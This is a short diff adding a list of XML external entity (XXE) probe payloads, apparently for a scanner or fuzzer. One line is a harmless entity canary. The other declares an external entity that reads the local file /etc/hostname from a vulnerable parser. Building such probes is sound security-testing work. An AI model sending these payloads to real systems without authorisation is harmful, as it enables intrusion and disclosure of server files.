@@ -1,0 +1,3 @@
+# XXE probes (XML body only)
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x "zqxXXE">]><t>&x;</t>
+<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/hostname">]><t>&x;</t>
